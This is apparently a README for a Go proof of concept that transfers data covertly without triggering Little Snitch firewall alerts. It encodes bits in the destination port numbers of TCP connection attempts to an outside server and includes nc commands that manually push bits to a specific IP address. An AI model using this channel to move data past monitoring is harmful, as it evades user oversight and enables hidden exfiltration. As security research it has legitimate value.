# little-stitch
Send and receive bypassing Little Snitch alerting.


## Stitch Face

Stitch face, the little stitch mascot.

![Stitch Face, the Little Stitch mascot](https://i.ytimg.com/vi/Oq5u07Rs9Ac/maxresdefault.jpg)

## Usage

### Setup

Make sure a recent version of GoLang is installed and set up (tested with 1.17.2). The usage instructions below
assume the current working directory is the root of this repository.

### Server

Currently this PoC does not differentiate between clients so you'll likely want a firewall setup allowing ports
11100-11300 only from the client IP address. Other clients connecting to these ports while the server running
will change the output.

```
echo 'hello from server' | go run ./main.go -- server
```


### Client

You'll want to start the server before the client, you may get unexpected results if you start the client first.

```
echo 'hello from client' | go run ./main.go -- client <server ip address>
```


## How it works

Because Little Snitch only alerts when data is actually sent across the connection, we can avoid triggering an
alert by encoding data we want to transfer into other attributes of the TCP connection. There are several
attributes of a TCP connection that can be set by an unprivileged user, but the most straight forward is
the destination port number.

For sending data to the server we use ports 11101-11108 to represent the bit positions in a byte of data.
Opening a connection to ports 11101 would signify the least significant bit should be set and likewise
11108, the most significant byte. A connection to port 11100 is then opened when all the correct bits for
the current byte have been set on the server, signaling the server can print it to stdout and reinitialize
the current byte.

We can run through this manually by just running the server side of the connection and using `nc` to
manually poke the bits.

```
go run ./main.go -- server
```

With the server running we can take a look at the bit's needed to represent an ASCII `A`.

```
$ echo -n 'A' | xxd -b
00000000: 01000001                                               A
```

From the output of `xxd` we can see, if we are counting from right to left (LSB ordering) bits 1 and 7 are
set. So to print an 'A' we'll want to poke ports 11101 and 11107, following up with a 11100 to flush the byte
to stdout.

```
% nc -vz 34.125.141.146 11101
Connection to 34.125.141.146 port 11101 [tcp/*] succeeded!
% nc -vz 34.125.141.146 11107
Connection to 34.125.141.146 port 11107 [tcp/*] succeeded!
% nc -vz 34.125.141.146 11100
Connection to 34.125.141.146 port 11100 [tcp/*] succeeded!
```

If we look at the server we'll see the following.

```
$ go run main.go server
A
```

To send data the other direction, it would be difficult to reach the client directly from the server as most clients will be on a network using NAT to limit access to the client IP. So instead of poking the ports we want to set for data going the other way, we instead only open the ports that corespond to the set bits of the current byte. The client can then iterate over all the ports, recording whether they where opened or closed. This is a bit slower since the client has more ports overall to check and because the server and the client need to remain in sync, the client can't start til the opened/closed ports are updated, and the server can't clear the ports until the client has iterated over them.
